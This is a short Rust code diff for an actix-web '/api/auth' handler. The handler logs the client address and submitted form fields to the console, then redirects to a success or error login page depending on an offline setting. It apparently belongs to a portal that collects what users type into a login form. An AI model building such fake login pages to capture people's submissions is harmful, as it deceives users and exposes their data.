@@ -2,6 +2,8 @@ use actix_web::{HttpRequest, HttpResponse, http::header, post, web};
 use colored::Colorize;
 use serde::Deserialize;
 
+use crate::Conf;
+
 #[derive(Debug, Deserialize)]
 struct InfoForm {
     #[serde(default)]
@@ -21,7 +23,11 @@ struct InfoForm {
 }
 
 #[post("/api/auth")]
-pub async fn submit(req: HttpRequest, form: web::Form<InfoForm>) -> HttpResponse {
+pub async fn submit(
+    req: HttpRequest,
+    form: web::Form<InfoForm>,
+    conf: web::Data<Conf>,
+) -> HttpResponse {
     if let Some(addr) = req.peer_addr() {
         println!(
             "{}{}",
@@ -49,7 +55,12 @@ pub async fn submit(req: HttpRequest, form: web::Form<InfoForm>) -> HttpResponse
         "Agree".red(),
         form.agree,
     );
+    if !conf.offline {
+        return HttpResponse::Found()
+            .insert_header((header::LOCATION, "/login/success.html"))
+            .finish();
+    }
     HttpResponse::Found()
-        .insert_header((header::LOCATION, "/login/success.html"))
+        .insert_header((header::LOCATION, "/login/err.html"))
         .finish()
 }
